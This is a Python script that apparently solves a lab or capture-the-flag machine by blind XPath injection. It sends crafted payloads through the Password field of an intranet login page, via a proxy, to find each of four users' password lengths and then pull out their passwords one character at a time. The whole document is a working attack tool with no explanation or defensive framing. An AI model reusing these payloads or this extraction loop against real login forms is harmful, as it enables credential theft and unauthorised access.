import string
import requests
from bs4 import BeautifulSoup

usersAmount = 4
passwdLengths = {k: 0 for k in range(1, usersAmount + 1)}
passwds = {k: "" for k in range(1, usersAmount + 1)}

def isTrue(responseBody):
    soup = BeautifulSoup(responseBody, "html.parser")
    return soup.select_one(".w3-row-padding.w3-grayscale") != None

def sendPayload(payload):
    return requests.post("http://172.31.179.1/intranet.php", data={
        "Username": "dontcare",
        "Password": payload
    }, proxies={
        "http": "http://10.10.10.200:3128"
    })

for userId in range(1, usersAmount + 1):
    for passwdLength in range(5, 64):
        res = sendPayload(f"'] | //*[{userId}][string-length(Password)={passwdLength}] | /foo[bar='")

        if isTrue(res.text):
            passwdLengths[userId] = passwdLength
            break

    for currentLength in range(1, passwdLengths[userId] + 1):
        for char in string.printable:
            res = sendPayload(f"'] | //*[{userId}][substring(Password,1,{currentLength})='{passwds[userId] + char}'] | /foo[bar='")
            if isTrue(res.text):
                passwds[userId] += char
                break

print(passwds)
